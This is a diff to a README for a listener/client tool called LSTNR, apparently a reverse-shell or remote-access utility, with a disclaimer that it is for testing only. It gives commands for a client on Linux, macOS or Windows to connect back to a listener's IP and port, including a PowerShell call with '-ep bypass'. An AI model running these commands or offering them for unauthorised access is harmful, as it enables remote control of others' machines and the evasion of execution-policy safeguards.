@@ -10,7 +10,8 @@ This is only for testing purposes, not intended for anything illegal. I was test
 
 ```git clone github.com/bwithe/LSNTR```
 
-# USAGE: CLI
+# USAGE
+
 1. Start LSTNR
     - `python3 lstnr.py -p <PORT_TO_LISTEN>`
 
@@ -19,6 +20,7 @@ This is only for testing purposes, not intended for anything illegal. I was test
 2. Have CLIENT connect to LSTNR
     - Linux / MacOS
       - `python3 client.py -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
+OR
       - `bash client.sh -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
     - Windows
         - `powershell -ep bypass .\client.ps1 -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
